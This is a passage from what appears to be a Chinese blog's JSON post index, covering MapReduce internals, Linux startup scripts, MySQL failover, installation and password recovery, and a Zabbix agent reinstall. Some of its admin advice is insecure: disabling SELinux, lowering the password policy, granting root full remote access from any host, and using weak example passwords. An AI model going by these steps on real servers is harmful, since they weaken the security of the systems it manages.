第一阶段是把输入文件按照一定的标准进行分片(InputSplit)，每个输入片的大小是固定的。默认情况下，输入片(InputSplit)的大小与数据块(Block)的大小是相同的。如果数据块(Block)的大小是默认值64MB，输入文件有两个，一个是32MB，一个是72MB。那么小的文件是一个输入片，大文件会分为两个数据块，那么是两个输入片。一共产生三个输入片。每一个输入片由一个Mapper进程处理。这里的三个输入片，会有三个Mapper进程处理。 第二阶段是对输入片中的记录按照一定的规则解析成键值对。有个默认规则是把每一行文本内容解析成键值对。“键”是每一行的起始位置(单位是字节)，“值”是本行的文本内容。 第三阶段是调用Mapper类中的map方法。第二阶段中解析出来的每一个键值对，调用一次map方法。如果有1000个键值对，就会调用1000次map方法。每一次调用map方法会输出零个或者多个键值对。 第四阶段是按照一定的规则对第三阶段输出的键值对进行分区。比较是基于键进行的。比如我们的键表示省份(如北京、上海、山东等)，那么就可以按照不同省份进行分区，同一个省份的键值对划分到一个区中。默认是只有一个区。分区的数量就是Reducer任务运行的数量。默认只有一个Reducer任务。 第五阶段是对每个分区中的键值对进行排序。首先，按照键进行排序，对于键相同的键值对，按照值进行排序。比如三个键值对、、，键和值分别是整数。那么排序后的结果是、、。如果有第六阶段，那么进入第六阶段；如果没有，直接输出到本地的linux文件中。 第六阶段是对数据进行归约处理，也就是reduce处理。键相等的键值对会调用一次reduce方法。经过这一阶段，数据量会减少。归约后的数据输出到本地的linxu文件中。本阶段默认是没有的，需要用户自己增加这一阶段的代码。 Reducer任务详解每个Reducer任务是一个java进程。Reducer任务接收Mapper任务的输出，归约处理后写入到HDFS中，可以分为如下图所示的几个阶段。 第一阶段是Reducer任务会主动从Mapper任务复制其输出的键值对。Mapper任务可能会有很多，因此Reducer会复制多个Mapper的输出。 第二阶段是把复制到Reducer本地数据，全部进行合并，即把分散的数据合并成一个大的数据。再对合并后的数据排序。 第三阶段是对排序后的键值对调用reduce方法。键相等的键值对调用一次reduce方法，每次调用会产生零个或者多个键值对。最后把这些输出的键值对写入到HDFS文件中。 Shuffle—MapReduce心脏Shuffle过程是MapReduce的核心，也被称为奇迹发生的地方。 上面这张图是官方对Shuffle过程的描述，可以肯定的是，单从这张图基本不可能明白Shuffle的过程，因为它与事实相差挺多，细节也是错乱的。Shuffle可以大致理解成怎样把map task的输出结果有效地传送到reduce端。也可以这样理解， Shuffle描述着数据从map task输出到reduce task输入的这段过程。 在Hadoop这样的集群环境中，大部分map task与reduce task的执行是在不同的节点上。很多时候Reduce执行时需要跨节点去拉取其它节点上的map task结果【注意：Map输出总是写到本地磁盘，但是Reduce输出不是，一般是写到HDFS】。 如果集群正在运行的job有很多，那么task的正常执行对集群内部的网络资源消耗会很严重。这种网络消耗是正常的，我们不能限制，能做的 就是最大化地减少不必要的消耗。还有在节点内，相比于内存，磁盘IO对job完成时间的影响也是可观的。从最基本的要求来说，我们对Shuffle过程的 期望可以有： 完整地从map task端拉取数据到reduce 端。 在跨节点拉取数据时，尽可能地减少对带宽的不必要消耗。 减少磁盘IO对task执行的影响。 比如为了减少磁盘IO的消耗，我们可以调节io.sort.mb的属性。每个Map任务都有一个用来写入输出数据的循环内存缓冲区，这个缓冲区默认大小是100M，可以通过io.sort.mb设置，当缓冲区中的数据量达到一个特定的阀值(io.sort.mb * io.sort.spill.percent，其中io.sort.spill.percent 默认是0.80)时，系统将会启动一个后台线程把缓冲区中的内容spill 到磁盘。在spill过程中，Map的输出将会继续写入到缓冲区，但如果缓冲区已经满了，Map就会被阻塞直道spill完成。 spill线程在把缓冲区的数据写到磁盘前，会对他进行一个二次排序，首先根据数据所属的partition排序，然后每个partition中再按Key排序。输出包括一个索引文件和数据文件，如果设定了Combiner，将在排序输出的基础上进行。Combiner就是一个Mini Reducer，它在执行Map任务的节点本身运行，先对Map的输出作一次简单的Reduce，使得Map的输出更紧凑，更少的数据会被写入磁盘和传送到Reducer。Spill文件保存在由mapred.local.dir指定的目录中，Map任务结束后删除。 Shuffle其他细节这里不再详述，下面这些文章可能对大家有所帮助：http://my.oschina.net/u/2003855/blog/310301http://blog.csdn.net/thomas0yang/article/details/8562910","link":"/2017/03/01/MapReduce%E8%AF%A6%E8%A7%A3/"},{"title":"Linux开机启动程序详解","text":"init进程init进程是非内核进程中第一个被启动运行的，因此它的进程编号PID的值总是1。init读它的配置文件/etc/inittab，决定需要启动的运行级别(Runlevel)。从根本上说，运行级别规定了整个系统的行为，每个级别(分别由0到6的整数表示)满足特定的目的。如果定义了initdefault级别，这个值就直接被选中，否则需要由用户输入一个代表运行级别的数值。输入代表运行级别的数字之后，init根据/etc/inittab文件中的定义执行一个命令脚本程序。缺省的运行级别取决于安装阶段对登录程序的选择：是使用基于文本的，还是使用基于X-Window的登录程序。rc命令脚本程序我们已经知道，当运行级别发生改变时，将由/etc/inittab文件定义需要运行哪一个命令脚本程序。这些命令脚本程序负责启动或者停止该运行级别特定的各种服务。由于需要管理的服务数量很多，因此需要使用rc命令脚本程序。其中，最主要的一个是/etc/rc.d/rc，它负责为每一个运行级别按照正确的顺序调用相应的命令脚本程序。我们可以想象，这样一个命令脚本程序很容易变得难以控制！为了防止这类事件的发生，需要使用精心设计的方案。 对每一个运行级别来说，在/etc/rc.d子目录中都有一个对应的下级目录。这些运行级别的下级子目录的命名方法是rcX.d，其中的X就是代表运行级别的数字。比如说，运行级别3的全部命令脚本程序都保存在/etc/rc.d/rc3.d子目录中。在各个运行级别的子目录中，都建立有到/etc/rc.d/init.d子目录中命令脚本程序的符号链接，但是，这些符号链接并不使用命令脚本程序在/etc/rc.d/init.d子目录中原来的名字。如果命令脚本程序是用来启动一个服务的，其符号链接的名字就以字母S打头；如果命令脚本程序是用来关闭一个服务的，其符号链接的名字就以字母K打头。许多情况下，这些命令脚本程序的执行顺序都很重要。如果没有先配置网络接口，就没有办法使用DNS服务解析主机名！为了安排它们的执行顺序，在字母S或者K的后面紧跟着一个两位数字，数值小的在数值大的前面执行。比如：/etc/rc.d/rc3.d/S50inet就会在/etc/rc.d/rc3.d/S55named之前执行(S50inet配置网络设置，55named启动DNS服务器)。存放在/etc/rc.d/init.d子目录中的、被符号链接上的命令脚本程序是真正的实干家，是它们完成了启动或者停止各种服务的操作过程。当/etc/rc.d/rc运行通过每个特定的运行级别子目录的时候，它会根据数字的顺序依次调用各个命令脚本程序执行。它先运行以字母K打头的命令脚本程序，然后再运行以字母S打头的命令脚本程序。对以字母K打头的命令脚本程序来说，会传递Stop参数；类似地对以字母S打头的命令脚本程序来说，会传递Start参数。编写自己的rc命令脚本在维护Linux系统运转的日子里，肯定会遇到需要系统管理员对开机或者关机命令脚本进行修改的情况。 一、/etc/rc.d/rc.local这是一个最简单的方法，编辑“/etc/rc.d/rc.local(链接地址为/etc/rc.local)”，把启动程序的shell命令输入进去即可，输入命令的全路径，类似于windows下的“启动”。 12345678910111213141516#在centos7中,/etc/rc.d/rc.local文件的权限被降低了,开机的时候执行自己的脚本是不能起动一些服务的,执行下面的命令可以将文件标记为可执行的文件chmod +x /etc/rc.d/rc.localvim /etc/rc.d/rc.local# 文件最后添加可执行脚本/data/run/script/start-service.sh#在脚本中输入启动服务的命令，如开机启动tomcat#!/bin/bashexport JDK_HOME=/home/java/jdk1.8.0_91export JAVA_HOME=/home/java/jdk1.8.0_91/home/tomcat/apache-tomcat-8.0.36/bin/startup.sh#赋予执行权限chmod +x /data/run/script/start-service.sh 这样，start-service.sh脚本在开机的时候就会被执行了,以后自启动服务可以直接添加在该脚本中。 二、chkconfig123456789101112131415161718192021222324252627# 查看nginx服务启动选项的配置状态chkconfig --list | grep nginx# 0 - 停机# 1 - 单用户模式 # 2 - 多用户，没有NFS # 3 - 完全多用户模式(标准的运行级，命令行模式启动) # 4 - 没有用到 # 5 - X11(xwindow，图形界面启动) # 6 - 重新启动 # 运行级别最常用的设置为2,3,5nginx 0:off 1:off 2:on 3:on 4:on 5:on 6:off#添加系统服务chkconfig --add nginx#删除系统服务chkconfig --del nginx#让mysql服务在命令行模式，随系统启动chkconfig --level 3 mysql on#取消mysql service在runlevel3的自动启动设置chkconfig --level 5 mysql off#查看哪些程序被添加为自启动，即查看这个文件中添加了哪些程序路径cat /etc/rc.local 三、crontab通过crontab可以设定程序的执行时间表，例如让程序在每天的8点，或者每个星期一的10点执行一次。crontab -l 列出时间表；crontab -e编辑时间表；crontab -d删除时间表； “-l”就是一个查看而已；“-e”是编辑，和vi没什么差别（其实就是用vi编辑一个特定文件）；“-d”基本不用，因为它把该用户所有的时间表都删除了，一般都是用“-e”编辑把不要了的时间表逐行删除； 那到底该如何编辑呢？ crontab文件的格式是：M H D m d CMD。一个6个字段，其中最后一个CMD就是所要执行的程序，如haha.sh。M：分钟（0-59）H：小时（0-23）D：日期（1-31）m：月份（1-12）d：一个星期中的某天（0-6，0代表周日） 这5个时间字段用空格隔开，其值可以是一个数字，也可以用逗号隔开的多个数字（或其他） ，如果不需设置，则默认为“*”。 例如，每天的8点5分执行haha.sh，就是“5 8 * /opt/./haha.sh”。 好像和“开机程序自动启动”扯远了，现在回归正题。其实上面介绍的crontab的功能已经具备了开机自动启动的能力，可以写一个监测脚本，每5分钟执行一次（/5 * ./haha.sh），如果程序不在了就重新启动一次。","link":"/2016/09/06/Linux%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F%E8%AF%A6%E8%A7%A3/"},{"title":"MySQL中间件Atlas安装及使用","text":"简介Atlas是由 Qihoo 360公司Web平台部基础架构团队开发维护的一个基于MySQL协议的数据中间层项目。它在MySQL官方推出的MySQL-Proxy 0.8.2版本的基础上，修改了大量bug，添加了很多功能特性。而且安装方便。配置的注释写的蛮详细的，都是中文。 主要功能 读写分离 从库负载均衡 IP过滤 自动分表 DBA可平滑上下线DB 自动摘除宕机的DB 相关链接Mysql中间件产品比较：http://songwie.com/articlelist/44Atlas的安装：https://github.com/Qihoo360/Atlas/wiki/Atlas的安装Atlas功能特点FAQ：https://github.com/Qihoo360/Atlas/wiki/Atlas功能特点FAQAtlas性能特点：https://github.com/Qihoo360/Atlas/wiki/Atlas的性能测试Atlas架构：https://github.com/Qihoo360/Atlas/wiki/Atlas的架构Atlas+Keepalived：http://sofar.blog.51cto.com/353572/1601552Atlas各项功能验证：http://blog.itpub.net/27000195/viewspace-1421262/ 官网教程很详细，且是中文，这里就不详述相关安装过程了 设置开机自启动1echo \"/usr/local/mysql-proxy/bin/mysql-proxyd test start\" &gt;&gt; /etc/rc.local 添加atlas服务12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 编写简单的Atlas启动脚本vim /etc/init.d/atlas#!/bin/sh start() { /usr/local/mysql-proxy/bin/mysql-proxyd test start} stop() { /usr/local/mysql-proxy/bin/mysql-proxyd test stop}status() { /usr/local/mysql-proxy/bin/mysql-proxyd test status }restart() { /usr/local/mysql-proxy/bin/mysql-proxyd test restart} ATLAS=\"/usr/local/mysql-proxy/bin/mysql-proxyd\" [ -f $ATLAS ] || exit 1 # See how we were called. case \"$1\" in start) start ;; stop) stop ;; restart) restart ;; status) status ;; # stop sleep 3 start ;; *) echo $\"Usage: $0 {start|stop|status|restart}\" exit 1 esac exit 0 # atlas服务验证service atlas statusservice atlas startservice atlas restartservice atlas stop 查看MySQL监听端口1234etstat -tanlp | grep mysqltcp 0 0 0.0.0.0:2345 0.0.0.0:* LISTEN 21449/mysql-proxy tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 24096/mysqld tcp 0 0 0.0.0.0:1234 0.0.0.0:* LISTEN 21449/mysql-proxy Atlas安装及卸载12345# 安装sudo rpm -i Atlas-2.2.1.el6.x86_64.rpm# 卸载sudo rpm -e Atlas-2.2.1.el6.x86_64 问题相关问题：atlas安装后，读写分离测试，为什么读一直走主库 回答：有事务存在的情况下，会强制走主库。解决方法，添加注解[@Transactional(propagation=Propagation.NOT_SUPPORTED)];若不涉及事务，检查主从库的用户名密码配置是否一致，是否设置为允许远程登录，并执行[FLUSH PRIVILEGES]。 问题：读写分离自测成功，java程序连接Atlas后却不能读写分离，所有的请求都发向主库，这是为什么？回答：检查一下java框架，是不是默认将autocommit设置为0了，很多java框架将语句都封装在一个事务中，而Atlas会将事务请求都发向主库。 问题：执行相关命令，成功上下线从库DB后，为什么从库仍然可以同步主库数据回答：atlas是中间件，只是提供了访问层的代理，代理和主从没有关系，数据库的主从还需自己配置。而上下线从库DB，只是说读的请求不再发往相应的从库了，事先配置的主从关系并不会改变。还有目前的atlas暂不支持多主模式。 问题：Atlas碰到解决不了的问题怎么办？回答：将相关环境、步骤和运行截图发邮件至zhuchao[AT]360.cn，或者加QQ群326544838。我一问题纠结了几小时，然后发送邮件了，三分钟后就回复我了，震惊了 (¯﹃¯) 更新中。。。","link":"/2016/10/18/MySQL%E4%B8%AD%E9%97%B4%E4%BB%B6Atlas%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"},{"title":"MySQL主从切换","text":"生产环境中，架构很多为一主多从。比如一个主数据库M，两个从数据库S1，S2同时指向主数据库M。 当主服务器M因为意外情况宕机，需要将其中的一个从数据库服务器（假设选择S1）切换成主数据库服务器，同时修改另一个从数据库（S2）的配置，使其指向新的主数据库（S1）。 此外还需要通知应用修改主数据库的IP地址，如果可能，将出现故障的主数据库(M)修复或者重置成新的从数据库。通常我们还有其他的方案来实现高可用，比如MHA，MySQL Cluster，MMM，这些暂不讨论。 操作步骤1、首先要确保所有的从数据库都已经执行了relay log中的全部更新，在每个从库上，执行stop slave io_thread，停止IO线程，然后检查show processlist的输出，直到看到状态是Slave has read all relay log; waiting for the slave I/O thread to update it，表示更新都执行完毕 S1(从库1操作)：12345678910111213141516171819202122232425mysql&gt; stop slave io_thread;Query OK, 0 rows affected (0.06 sec)mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 3 User: system user Host: db: NULLCommand: Connect Time: 2601 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL*************************** 2. row *************************** Id: 4 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlistrows in set (0.00 sec)mysql&gt; S2(从库2操作)：12345678910111213141516171819202122232425mysql&gt; stop slave io_thread; Query OK, 0 rows affected (0.00 sec)mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 4 User: system user Host: db: NULLCommand: Connect Time: 2721 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL*************************** 2. row *************************** Id: 5 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlistrows in set (0.00 sec)mysql&gt; 2、在从库S1上，执行stop slave停止从服务，然后执行reset master以重置成主数据库，并且进行授权账号，让S2（从库2）有权限进行连接 S1（从库1操作）： 12345678910mysql&gt; stop slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; reset master;Query OK, 0 rows affected (0.06 sec)mysql&gt; grant replication slave on *.* to 'repl'@'192.168.0.100' identified by '123456';Query OK, 0 rows affected (0.00 sec)mysql&gt; 3、在S2（从库2）上，执行stop slave停止从服务，然后执行change master to master_host='S1'以重新设置主数据库，然后再执行start slave启动复制： S2（从库2操作）： 12345678910mysql&gt; stop slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; change master to master_host='192.168.0.20';Query OK, 0 rows affected (0.06 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; 4、查看S2（从库2）复制状态是否正常： 123456789101112131415161718192021222324252627282930313233343536373839404142434445mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.0.20 Master_User: repl Master_Port: 3306 Connect_Retry: 2 Master_Log_File: mysql-bin.000001 Read_Master_Log_Pos: 261 Relay_Log_File: MySQL-02-relay-bin.000002 Relay_Log_Pos: 407 Relay_Master_Log_File: mysql-bin.000001 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: yayun.% Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 261 Relay_Log_Space: 566 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 2row in set (0.00 sec)mysql&gt; 查看原来的从库S1，现在的主库的show processlist情况：12345678910111213141516171819202122mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 4 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlist*************************** 2. row *************************** Id: 7 User: repl Host: 192.168.0.100:60235 db: NULLCommand: Binlog Dump Time: 184 State: Master has sent all binlog to slave; waiting for binlog to be updated Info: NULLrows in set (0.00 sec)mysql&gt; 5、通知所有的客户端将应用指向S1（已提升为主库）,这样客户端发送的所有的更新变化将记录到S1的二进制日志。 6、删除S1（新的主库）服务器上的master.info和relay-log.info文件，否则下次重启时还会按照从库启动。我们也可以设置该参数：1skip_slave_start 7、最后，如果M服务器修复以后，则可以按照S2的方法配置成S1的从库。 8、上面的测试步骤中S1默认都是打开log-bin选项的，这样重置成主数据库后可以将二进制日志记录下来，并传送到其他从库，这是提升为主库必须的。其次，S1没有打开log-slave-updates参数，否则重置成主库以后，可能会将已经执行过的二进制日志重复传送给S2，导致S2同步错误。 相关链接主从切换脚本参考链接：http://blog.itpub.net/25356953/viewspace-1745534/","link":"/2016/10/14/MySQL%E4%B8%BB%E4%BB%8E%E5%88%87%E6%8D%A2/"},{"title":"MySQL备份与恢复","text":"最近整理了下MySQL备份与恢复的知识点，部分知识点还附有链接。 内容持续更新中，访问地址：https://www.processon.com/view/link/58805970e4b098bf4cddc5cd","link":"/2017/01/17/MySQL%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"title":"MySQL安装及卸载","text":"安装此安装为手动安装，非yum安装。官网下载地址：http://downloads.mysql.com/archives/community/ 1234567891011121314151617181920212223#解压cd /usr/local/tar -zxvf mysql-5.7.13-linux-glibc2.5-x86_64.tar.gzmv mysql-5.7.13-linux-glibc2.5-x86_64 mysql#创建实例目录mkdir /data/mysql#创建数据目录mkdir /data/mysql/data#创建日志目录mkdir /data/mysql/logs#添加用户、组groupadd mysqluseradd -r -g mysql -s /bin/false mysql#设置权限chown -R mysql:mysql /usr/local/mysql /data/mysqlchmod 750 /usr/local/mysql /data/mysql#安装，初始化数据库yum install -y libaio/usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql/data 1234567891011121314151617181920212223242526#配置文件cp -rf /usr/local/mysql/support-files/my-default.cnf /data/mysqlmv my-default.cnf my.cnf#my.cnf参数配置[mysql]socket = /data/mysql/mysql.sock[mysqld]lower_case_table_names = 1basedir = /usr/local/mysqldatadir = /data/mysql/dataport = 3306socket = /data/mysql/mysql.sock[mysqld_safe]user = mysqlport = 3306datadir = /data/mysql/datalog-error = /data/mysql/logs/mysqld.logpid-file = /data/mysql/mysql.pidsocket = /data/mysql/mysql.socksql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES 1234#启动服务 设置密码/usr/local/mysql/bin/mysqld_safe --defaults-file=/data/mysql/my.cnf &amp;sleep 3/usr/local/mysql/bin/mysqladmin -u root password wx123 --socket=/data/mysql/mysql.sock 12345#设置环境变量vim /etc/profileexport PATH=/usr/local/mysql/bin:$PATHsource /etc/profile 1234567891011# 配置启动脚本cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqlvim /etc/init.d/mysqlbasedir=/usr/local/mysqldatadir=/data/mysql/datamysqld_pid_file_path=/data/mysql/mysql.pid#$bindir/mysqld_safe --datadir=\"$datadir\" --pid-file=\"$mysqld_pid_file_path\" $other_args &gt;/dev/null 2&gt;&amp;1 &amp;$bindir/mysqld_safe --defaults-file=/data/mysql/my.cnf 1&gt;/dev/null &amp; 1234#配置服务chmod +x /etc/init.d/mysqlchkconfig --add mysqlservice mysql restart 1234#开机自启动chkconfig mysql onchkconfig --list|grep mysql# mysql 0:off 1:off 2:off 3:on 4:on 5:on 6:off 卸载手动删除123456789101112#停掉mysql服务service mysql stop#删除安装目录rm -rf /usr/local/mysql#删除数据目录rm -rf /data/mysql#删除残留文件find / -name '*mysql*'rm -rf XXX yum删除123456yum list installed | grep mysqlyum remove XXX#删除残留文件find / -name '*mysql*'rm -rf XXX 自动化部署脚本https://github.com/Wasim37/deployment-scripts/tree/master/mysql 相关链接my.cnf配置文件：https://blog.linuxeye.com/379.htmlMySQL5.6安装：https://www.cnblogs.com/wangdaijun/p/6132632.html","link":"/2016/09/27/MySQL%E5%AE%89%E8%A3%85%E5%8F%8A%E5%8D%B8%E8%BD%BD/"},{"title":"MySQL数据目录更改及相关问题解决方案","text":"步骤相关1、停掉MySQL服务service mysql stop 2、把旧的数据目录/var/lib/mysql备份到新的数据目录/data/mysqlcp /var/lib/mysql /data -R 3、给mysql组的mysql用户赋予新的数据目录的权限chown -R mysql:mysql /data/mysql 4、修改my.cnfdatadir=/var/lib/mysql，改为datadir=/data/mysql 5、如果mysql事先为手动安装，还需修改MySQL启动脚本/etc/init.d/mysqldatadir=/data/mysql 6、重启MySQL服务service mysql restart 问题相关数据迁移后，服务启动失败，报如下错误1The server quit without updating PID file 原因：可能datadir目录修改或其他原因，mysql用户没有PID或其他相关文件的权限方案：相关目录执行 “chown -R mysql:mysql /data/mysql”，然后重启服务。 原因：可能已存在mysql进程方案：执行”ps -ef|grep mysqld”，用”kill -9 进程号”杀死已经发现的进程，然后重启服务。 原因：可能第二次重装mysql，残余数据影响了服务启动方案：去mysql数据目录/data看看，如果存在mysql-bin.index，先备份再删除试试。或者用”find / -name ‘mysql‘“查找残余数据，然后删除。 原因：selinux问题，如果是centos系统，可能会默认开启selinux方案：编辑 /etc/selinux/config，把 SELINUX=enforcing 改为 SELINUX=disabled ，然后重启服务。 原因：skip-federated字段问题方案：检查 my.cnf 文件是否有没被注释掉的 skip-federated 字段，如果有就注释掉。 原因：其他未知错误方案：在 my.cnf 配置错误日志，log-error=/data/mysql/mysqld.log，再次重启，如果失败查看相关日志。","link":"/2017/01/12/MySQL%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95%E6%9B%B4%E6%94%B9%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"Mysql5.7忘记root密码及修改root密码的方法","text":"Mysql 安装成功后，输入 mysql —version 显示版本如下1mysql Ver 14.14 Distrib 5.7.13-6, for Linux (x86_64) using 6.0 用默认密码登录报如下错误：1234mysqladmin -uroot -p password 'newpassword'Enter password:mysqladmin: connect to server at 'localhost' failederror: 'Access denied for user 'root'@'localhost' (using password: YES)' 解决方法：1234567891011/etc/init.d/mysql stopmysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp;mysql -u root mysqlmysql&gt; use mysqlmysql&gt; UPDATE user SET authentication_string=PASSWORD('newpassword') where USER='root';mysql&gt; FLUSH PRIVILEGES;mysql&gt; quit/etc/init.d/mysql restartmysql -uroot -pEnter password: &lt;输入新设的密码newpassword&gt; 注意：mysql5.7版本mysql数据库user表的密码字段为authentication_string, 其他版本大部分为password，update语句相应为：1UPDATE user SET Password=PASSWORD('newpassword') where USER='root'; 用重置的密码终于登录成功，结果发现操作任何sql语句都报如下错误：1You must reset your password using ALTER USER statement before executing this statement. 错误显示在操作sql语句前必须重置密码，然后试了好几个重置密码的语句都重置失败，陷入了死循环。这时发现错误提示修改密码需使用 Alter USER 语句，才找到了解决方法，可是又报密码过于简单的错误。 12mysql&gt; alter user 'root'@'localhost' identified by '123'; ERROR 1819 (HY000): Your password does not satisfy the current policy requirements 这个错误其实与validate_password_policy有关，mysql5.6版本后，推出了validate_password插件，加强了密码强度。可以使用 mysql&gt; show variables like “%vali%” 命令查看validate_password_policy值： Variable_name Value validate_password_dictionary_file validate_password_length 8 validate_password_mixed_case_count 1 validate_password_number_count 1 validate_password_policy MEDIUM validate_password_special_char_count 1 validate_password_policy有以下取值： Policy Tests Performed 0 or LOW Length 1 or MEDIUM Length; numeric, lowercase/uppercase, and special characters 2 or STRONG Length; numeric, lowercase/uppercase, and special characters; dictionary file 默认是1，即MEDIUM，所以刚开始设置的密码必须符合长度，且必须含有数字，小写或大写字母，特殊字符。所以用alter user语句重设一个复杂的密码，发现设置成功。 如果不想密码设置过于复杂，只想设置root的密码为123456，需要修改默认规则set global validate_password_policy=0;set global validate_password_length=1;select @@validate_password_length;方法详见http://www.cnblogs.com/ivictor/p/5142809.html 最后授权root远程登录权限：1mysql&gt; Grant all privileges on *.* to 'root'@'%' identified by 'newpassword' with grant option;","link":"/2016/09/20/Mysql5.7%E5%BF%98%E8%AE%B0root%E5%AF%86%E7%A0%81%E5%8F%8A%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"Not supported by Zabbix Agent &amp; zabbix agent重装","text":"zabbix服务器显示一些监控项不起效，提示错误【Not supported by Zabbix Agent】，最后定位为zabbix客户端版本过低。 Not supported by Zabbix Agent两台被监控的服务器，配置文件设置都一样，但是其中一台某些监控项失效，初步怀疑是版本不一致12345#查看agent版本/usr/sbin/zabbix_agentd -V#或者通过yum命令查看已经安装的包yum list installed | grep zabbix-agent 结果显示zabbix agent版本分别为【2.2.14】和【1.8.22】，不起效的为1.8.22。以下是两个版本的安装过程：123456#2.2.14安装步骤【参照官网】rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpmyum install zabbix-agent#1.8.22安装步骤【相对官网，明显少了个步骤】yum install zabbix-agent yum install zabbix-agent为什么默认安装的是1.8.22？通过如下命令可以查看123yum list all | grep zabbix-agent# pcp-export-zabbix-agent.x86_64 3.10.9-6.el6 base # zabbix-agent.x86_64 1.8.22-1.el6 epel zabbix agent重装123456789101112131415# 卸载yum remove zabbix-agent# 安装rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpmyum install zabbix-agent# 启动及查看service zabbix-agent restartservice zabbix-agent status# zabbix_agentd (pid 32485) is running.../usr/sbin/zabbix_agentd -V# Zabbix Agent (daemon) v2.2.14 (revision 61184) (22 July 2016)# Compilation time: Jul 24 2016 06:52:24","link":"/2016/09/25/Not%20supported%20by%20Zabbix%20Agent%20&%20zabbix%20agent%E9%87%8D%E8%A3%85/"},{"title":"Python 一切皆对象","text":"Python从设计之初就是一门面向对象的语言，它有一个重要的概念，即一切皆对象。 Java虽然也是面向对象编程的语言，但是血统没有Python纯正。比如Java的八种基本数据类型之一int，在持久化的时候，就需要包装成Integer类对象。但是在python中，一切皆对象。数字、字符串、元组、列表、字典、函数、方法、类、模块等等都是对象，包括你的代码。 对象的概念究竟何谓对象？不同的编程语言以不同的方式定义“对象”。某些语言中，它意味着所有对象必须有属性和方法；另一些语言中，它意味着所有的对象都可以子类化。 在Python中，定义是松散的，某些对象既没有属性也没有方法，而且不是所有的对象都可以子类化。但是Python的万物皆对象从感性上可以解释为：Python 中的一切都可以赋值给变量或者作为参数传递给函数。 Python 的所有对象都有三个特性： 身份：每个对象都有一个唯一的身份标识自己，任何对象的身份都可以使用内建函数 id() 来得到，可以简单的认为这个值是该对象的内存地址。123&gt;&gt;&gt; a = 1&gt;&gt;&gt; id(a)&gt;&gt;&gt; 26188904 # 身份由这样一串类似的数字表示 类型：对象的类型决定了对象可以保存什么类型的值，有哪些属性和方法，可以进行哪些操作，遵循怎样的规则。可以使用内建函数 type() 来查看对象的类型。 1234&gt;&gt;&gt; type(a)&lt;type 'int'&gt;&gt;&gt;&gt; type(type)&lt;type 'type'&gt; #万物皆对象，type 也是一种特殊的对象 type 值：对象所表示的数据 12&gt;&gt;&gt; a1 “身份”、”类型”和”值”在所有对象创建时被赋值。如果对象支持更新操作，则它的值是可变的，否则为只读（数字、字符串、元组等均不可变）。只要对象还存在，这三个特性就一直存在。 对象的属性：大部分 Python 对象有属性、值或方法，使用句点（.）标记法来访问属性。最常见的属性是函数和方法，一些 Python 对象也有数据属性，如：类、模块、文件等 对象的创建和引用1&gt;&gt;&gt; a = 3 简单来看，上边的代码执行了以下操作： 创建了一个对象来代表数字 3 如果变量 a 不存在，创建一个新的变量 a 将变量 a 和数字 3 进行连接，即 a 成为对象 3 的一个引用，从内部来看，变量是到对象的内存空间的一个指针，尤其注意：变量总是连接到对象，而不会连接到其他变量。 从概念上可以这样理解，对象是堆上分配的一个内存空间，用来表示对象所代表的值；变量是一个系统创建的表中的元素，拥有指向对象的引用；引用是从变量到对象的指针。 从技术上来说，每一个对象有两个标准的头部信息，一个类型标识符来标识类型，还有一个引用的计数器，用于决定是否需要对对象进行回收。这里还涉及到对象的一种优化方法，Python 缓存了某些不变的对象对其进行复用，而不是每次创建新的对象。123456&gt;&gt;&gt; a = 1&gt;&gt;&gt; b = 1&gt;&gt;&gt; id(a)26188904&gt;&gt;&gt; id(b)26188904 # a 和 b 都指向了同一对象 共享引用在 Python 中变量都是指向某一对象的引用，当多个变量都引用了相同的对象，成为共享引用。12345&gt;&gt;&gt; a = 1&gt;&gt;&gt; b = a&gt;&gt;&gt; a = 2&gt;&gt;&gt; b1 # 由于变量仅是对对象的一个引用，因此改变 a 并不会导致 b 的变化 但对于像列表这种可变对象来说则不同1234567&gt;&gt;&gt; a = [1, 2, 